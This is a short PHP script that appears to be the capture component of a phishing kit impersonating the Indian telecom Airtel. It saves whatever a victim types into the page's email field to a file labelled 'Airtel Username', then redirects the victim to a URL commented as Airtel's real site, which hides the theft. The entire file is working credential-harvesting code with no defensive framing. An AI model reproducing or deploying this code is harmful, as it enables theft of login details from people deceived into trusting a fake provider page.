<?php
file_put_contents("usernames.txt", "Airtel Username: " . $email = $_POST['email'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.airtel.in/
header("Location: $url");
?>